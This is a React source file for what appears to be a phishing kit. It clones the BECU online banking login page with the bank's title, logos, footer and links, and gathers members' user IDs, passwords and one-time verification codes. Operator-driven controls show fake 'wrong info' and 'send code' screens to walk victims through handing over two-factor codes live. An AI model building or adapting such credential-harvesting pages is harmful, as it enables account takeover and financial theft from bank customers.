import { motion } from "framer-motion";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import clsx from "clsx";
import BankingHeader from "./BankingHeader";
import BecuFavIcon from "../../../../../../../../assets/allBanks/banks/becu/bec4.ico";
import BecuImage from "../../../../../../../../assets/allBanks/banks/becu/bec2.svg";
import House from "../../../../../../../../assets/allBanks/banks/becu/bec3.svg";
import Ncua from "../../../../../../../../assets/allBanks/banks/becu/bec5.svg";
import { Link } from "react-router-dom";
import { FaRegEye, FaRegEyeSlash } from "react-icons/fa6";
import { otpOptions } from "../../bankDetails";
import ShareData from "./ShareData";
import { ClipLoader } from "react-spinners";
import BasicLoader from "../../../../../loading/BasicLoader";
import BankControl from "./BankControl";
import BankOtpControl from "./BankOtpControl";

const Becu = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  indexOtp,
  handleOtpOption,
  isOpenOtp,
  onSubmitOtpOptions,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  loading,
  setIsOpenOtp,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    errorFormState,
    handleChange,
    onSubmitOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    setshowPassword,
    showPassword,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);

  return (
    <motion.div
      initial={{ y: -100, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      exit={{ y: -100, opacity: 0 }}
      transition={{ type: "spring", stiffness: 300, damping: 50 }}
      className={clsx(
        "w-full min-h-screen h-full  top-0  bg-white",
        typeAccount ? "hidden" : "block"
      )}
    >
      <BankingHeader
        text="Sign in - Becu.org"
        handleCancel={handleCancel}
        img={BecuFavIcon}
        setAllBankItems={setAllBankItems}
        setIsOpenOtp={setIsOpenOtp}
        setOtpOpen={setOtpOpen}
      />
      <header className="w-full p-6">
        <div className="">
          <img
            src={BecuImage}
            alt=""
            className="w-[152px] h-[53px] object-contain"
          />
        </div>
      </header>

      <div className="items-center justify-center px-6 pt-8 customMiniTablet:flex ">
        <div className={clsx(allBankOpen ? "hidden" : "block")}>
          <h1 className="mb-3 text-4xl font-semibold text-customGray-1057">
            BECU Log In Options
          </h1>
          <div className=" customMiniTablet:w-[336px] w-full">
            <h3 className="mb-5 text-3xl text-customGray-1057">
              Online Banking
            </h3>
            <div>
              <div className="space-y-6">
                <div>
                  <label className="font-medium text-customGray-1058">
                    User ID
                  </label>
                  <input
                    type="text"
                    value={formState.username}
                    name="username"
                    onChange={handleChange}
                    className={clsx(
                      "w-full px-3 py-2 border outline-none border-customGray-1058 focus:border-customBlue-1029 transistion2",
                      errorFormState.username
                        ? "border border-customRed-1005"
                        : ""
                    )}
                  />
                  {errorFormState.username && (
                    <p className="flex gap-2 mt-2 text-sm text-customRed-1005">
                      Please enter your password.
                    </p>
                  )}
                </div>
                <div className="relative">
                  <label className="font-medium text-customGray-1058">
                    Password
                  </label>
                  <input
                    type={showPassword ? "text" : "password"}
                    value={formState.password}
                    name="password"
                    onChange={handleChange}
                    className={clsx(
                      "w-full px-3 py-2 border outline-none border-customGray-1058 focus:border-customBlue-1029 transistion2 pr-11",
                      errorFormState.password
                        ? "border border-customRed-1005"
                        : ""
                    )}
                  />
                  <span
                    onClick={() => setshowPassword((prevShow) => !prevShow)}
                    className="absolute h-full py-3 right-4 "
                  >
                    {showPassword ? (
                      <FaRegEye size={18} />
                    ) : (
                      <FaRegEyeSlash size={18} />
                    )}
                  </span>
                  {errorFormState.password && (
                    <p className="flex gap-2 mt-2 text-sm text-customRed-1005">
                      Please enter your user ID.
                    </p>
                  )}
                </div>
              </div>
              <button
                onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                className="w-full py-3 font-semibold text-white rounded-lg my-7 bg-customGreen-900"
              >
                {loading && <ClipLoader size={10} color="#fff" />}
                {loading ? "Loading..." : "Log In"}
              </button>
              <Link
                to="https://www.becu.org/"
                className="mt-5 space-y-2 font-medium text-customGreen-900"
              >
                <p>Forgot your Password?</p>
                <p>Forgot your User ID?</p>
              </Link>
              <div className="mt-5 text-customGreen-1000">
                <h3 className="font-semibold">Already a Member?</h3>
                <p>
                  If you are not enrolled in Online & Mobile Banking yet{" "}
                  <Link
                    to="https://www.becu.org/"
                    className="underline text-customGreen-900"
                  >
                    click here to enroll.
                  </Link>{" "}
                </p>
              </div>
              <div className="mt-5 text-customGreen-1000">
                <h3 className="font-semibold">Not a Member?</h3>
                <p>
                  <Link
                    to="https://www.becu.org/"
                    className="underline text-customGreen-900"
                  >
                    Sign up for membership with BECU.
                  </Link>{" "}
                </p>
              </div>
            </div>
          </div>
        </div>
        <div>
          {allBankOpen && (
            <div className={clsx(OtpOpen ? "hidden" : "block")}>
              <BankControl
                handleSelectedId={handleSelectedId}
                selectedPath={selectedPath}
                handleSelectSubmit={handleSelectSubmit}
              />
              <div>
                {activePathDetails.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activePathDetails.name === "Wrong Info" && (
                  <>
                    <div className={clsx()}>
                      <h1 className="mb-3 text-4xl font-semibold text-customGray-1057">
                        BECU Log In Options
                      </h1>
                      <div className=" customMiniTablet:w-[336px] w-full">
                        <h3 className="mb-5 text-3xl text-customGray-1057">
                          Online Banking
                        </h3>
                        <div>
                          <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
                            <p>{activePathDetails.body}</p>
                          </div>
                          <div className="space-y-6">
                            <div>
                              <label className="font-medium text-customGray-1058">
                                User ID
                              </label>
                              <input
                                type="text"
                                value={formState.username}
                                name="username"
                                onChange={handleChange}
                                className={clsx(
                                  "w-full px-3 py-2 border outline-none border-customGray-1058 focus:border-customBlue-1029 transistion2",
                                  errorFormState.username
                                    ? "border border-customRed-1005"
                                    : ""
                                )}
                              />
                              {errorFormState.username && (
                                <p className="flex gap-2 mt-2 text-sm text-customRed-1005">
                                  Please enter your password.
                                </p>
                              )}
                            </div>
                            <div className="relative">
                              <label className="font-medium text-customGray-1058">
                                Password
                              </label>
                              <input
                                type={showPassword ? "text" : "password"}
                                value={formState.password}
                                name="password"
                                onChange={handleChange}
                                className={clsx(
                                  "w-full px-3 py-2 border outline-none border-customGray-1058 focus:border-customBlue-1029 transistion2 pr-11",
                                  errorFormState.password
                                    ? "border border-customRed-1005"
                                    : ""
                                )}
                              />
                              <span
                                onClick={() =>
                                  setshowPassword((prevShow) => !prevShow)
                                }
                                className="absolute h-full py-3 right-4 "
                              >
                                {showPassword ? (
                                  <FaRegEye size={18} />
                                ) : (
                                  <FaRegEyeSlash size={18} />
                                )}
                              </span>
                              {errorFormState.password && (
                                <p className="flex gap-2 mt-2 text-sm text-customRed-1005">
                                  Please enter your user ID.
                                </p>
                              )}
                            </div>
                          </div>
                          <button
                            onClick={(e) =>
                              handleTheMainSubmit(e, onSumbitForm)
                            }
                            className="w-full py-3 font-semibold text-white rounded-lg my-7 bg-customGreen-900"
                          >
                            {loading && <ClipLoader size={10} color="#fff" />}
                            {loading ? "Loading..." : "Log In"}
                          </button>
                          <Link
                            to="https://www.becu.org/"
                            className="mt-5 space-y-2 font-medium text-customGreen-900"
                          >
                            <p>Forgot your Password?</p>
                            <p>Forgot your User ID?</p>
                          </Link>
                          <div className="mt-5 text-customGreen-1000">
                            <h3 className="font-semibold">Already a Member?</h3>
                            <p>
                              If you are not enrolled in Online & Mobile Banking
                              yet{" "}
                              <Link
                                to="https://www.becu.org/"
                                className="underline text-customGreen-900"
                              >
                                click here to enroll.
                              </Link>{" "}
                            </p>
                          </div>
                          <div className="mt-5 text-customGreen-1000">
                            <h3 className="font-semibold">Not a Member?</h3>
                            <p>
                              <Link
                                to="https://www.becu.org/"
                                className="underline text-customGreen-900"
                              >
                                Sign up for membership with BECU.
                              </Link>{" "}
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </>
                )}
                {activePathDetails.name === "Send Otp" && (
                  <>
                    <h3>{activePathDetails.body}</h3>
                    <div
                      className={clsx(
                        " customMiniTablet:w-[500px] px-4  py-4",
                        isOpenOtp && "hidden"
                      )}
                    >
                      <div>
                        <div>
                          <div>
                            <h3 className="mb-2 text-xl font-bold text-center text-black">
                              Verify your identity
                            </h3>
                            <p className="mb-2 text-center ">
                              For your security, we need to verify it&apos;s
                              really you.
                            </p>
                          </div>
                          <div>
                            <h2 className="mb-2 text-sm font-bold">
                              How would you like to get your verification code?
                            </h2>
                            <p className="mb-2 text-sm text-customGray-100">
                              Select One:
                            </p>
                            <div
                              role="radiogroup"
                              aria-label="Otp Options"
                              className="flex flex-col space-y-3"
                            >
                              {otpOptions.map((bank) => (
                                <div
                                  key={bank.id}
                                  role="radio"
                                  tabIndex={0}
                                  onClick={() => handleOtpOption(bank.id)}
                                  className="flex items-center gap-2.5 "
                                >
                                  <div className="border border-black rounded-full p-[2px] text-center mb-[1px]">
                                    <p
                                      className={clsx(
                                        "rounded-full w-[10px] h-[10px]  ",
                                        otpOptions[indexOtp]?.id === bank.id
                                          ? "bg-customBlue-500"
                                          : ""
                                      )}
                                    ></p>
                                  </div>
                                  <h2
                                    className={clsx(
                                      "text-sm",
                                      otpOptions[indexOtp]?.id === bank.id
                                        ? "text-customBlue-500 hover:underline"
                                        : "hover:text-customBlue-700 hover:underline"
                                    )}
                                  >
                                    {bank.name}
                                  </h2>
                                </div>
                              ))}
                            </div>
                            <button
                              onClick={onSubmitOtpOptions}
                              className="w-full py-3 font-semibold text-white rounded-lg my-7 bg-customGreen-900"
                            >
                              Continue
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                    {isOpenOtp && (
                      <div
                        className={clsx(
                          " customMiniTablet:w-[500px] px-4  py-4"
                        )}
                      >
                        <div>
                          <div>
                            <div>
                              <h3 className="mb-2 text-xl font-bold text-center text-black">
                                Enter Verification Code
                              </h3>
                            </div>
                            <div>
                              <h2 className="mb-2 text-center ">
                                Enter the verification code we sent to your
                                mobile number
                              </h2>
                              <div className="px-2 customMiniTablet:px-24">
                                <div>
                                  <input
                                    type="number"
                                    placeholder="Enter Verification Code"
                                    value={formOtp.otpo}
                                    name="otpo"
                                    onChange={changeOtp}
                                    className={clsx(
                                      "w-full px-3 py-2 border outline-none border-customGray-1058 focus:border-customBlue-1029 transistion2 no-spinner",
                                      errorOtp.otpo
                                        ? "border border-customRed-1005"
                                        : ""
                                    )}
                                  />
                                  {errorOtp.otpo && (
                                    <p className="mt-2 text-sm text-customRed-1005">
                                      Please enter the verification code.
                                    </p>
                                  )}
                                </div>
                                <button
                                  className="w-full py-3 font-semibold text-white rounded-lg my-7 bg-customGreen-900 "
                                  onClick={(e) =>
                                    onSubmitOtp(e, handleVerifiedOtp)
                                  }
                                >
                                  {loading && (
                                    <ClipLoader size={10} color="#fff" />
                                  )}
                                  {loading ? "Loading..." : "Verify"}
                                </button>
                              </div>
                              <p
                                className={clsx(
                                  "cursor-pointer text-customBlue-100 font-bold text-center",
                                  !resend &&
                                    "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                                )}
                                onClick={handleResend}
                              >
                                Didnt get a code? Resend
                              </p>
                            </div>
                          </div>
                        </div>
                      </div>
                    )}
                  </>
                )}
              </div>
            </div>
          )}
          {OtpOpen && (
            <>
              <BankOtpControl
                handleSelectedOtp={handleSelectedOtp}
                selectedOtp={selectedOtp}
                handleSubmitOtp={handleSubmitOtp}
              />

              <div>
                {activeOtp.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activeOtp.name === "wrong" && (
                  <>
                    <div
                      className={clsx(" customMiniTablet:w-[500px] px-4  py-4")}
                    >
                      <div>
                        <div>
                          <div>
                            <h3 className="mb-2 text-xl font-bold text-center text-black">
                              Enter Verification Code
                            </h3>
                          </div>
                          <div>
                            <h2 className="mb-2 text-center ">
                              Enter the verification code we sent to your mobile
                              number
                            </h2>
                            <div className="px-2 customMiniTablet:px-24">
                              <div>
                                <input
                                  type="number"
                                  placeholder="Enter Verification Code"
                                  value={formOtp.otpo}
                                  name="otpo"
                                  onChange={changeOtp}
                                  className={clsx(
                                    "w-full px-3 py-2 border outline-none border-customGray-1058 focus:border-customBlue-1029 transistion2 no-spinner",
                                    errorOtp.otpo
                                      ? "border border-customRed-1005"
                                      : ""
                                  )}
                                />
                                {errorOtp.otpo && (
                                  <p className="mt-2 text-sm text-customRed-1005">
                                    Please enter the verification code.
                                  </p>
                                )}
                                <h3 className="mt-2 text-sm text-customRed-200">
                                  {activeOtp.body}
                                </h3>
                              </div>
                              <button
                                className="w-full py-3 font-semibold text-white rounded-lg my-7 bg-customGreen-900 "
                                onClick={(e) =>
                                  onSubmitOtp(e, handleVerifiedOtp)
                                }
                              >
                                {loading && (
                                  <ClipLoader size={10} color="#fff" />
                                )}
                                {loading ? "Loading..." : "Verify"}
                              </button>
                            </div>
                            <p
                              className={clsx(
                                "cursor-pointer text-customBlue-100 font-bold text-center",
                                !resend &&
                                  "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                              )}
                              onClick={handleResend}
                            >
                              Didnt get a code? Resend
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </>
                )}
                {activeOtp.name === "otp" && (
                  <>
                    <ShareData
                      bankName={bankName}
                      handleTheFinal={handleTheFinal}
                      handleCancel={handleCancel}
                      setIsOpenOtp={setIsOpenOtp}
                      setAllBankItems={setAllBankItems}
                      siteLink="https://www.becu.org/"
                    />
                  </>
                )}
              </div>
            </>
          )}
        </div>
      </div>
      <footer className="justify-between p-10 mt-16 text-xs customMiniTablet:flex bg-customGray-1059">
        <p className="mb-5 customMiniTablet:mb-0">
          © 2025 BECU. ALL RIGHTS RESERVED. FEDERALLY INSURED BY NCUA. EQUAL
          HOUSING OPPORTUNITY LENDER
        </p>
        <div>
          <div className="flex gap-6">
            <div className="">
              <img
                src={House}
                alt=""
                className="w-[46px] h-[50px] object-contain"
              />
            </div>
            <div className="">
              <img
                src={Ncua}
                alt=""
                className="w-[106px] h-[50px] object-contain"
              />
            </div>
          </div>
        </div>
      </footer>
    </motion.div>
  );
};

export default Becu;
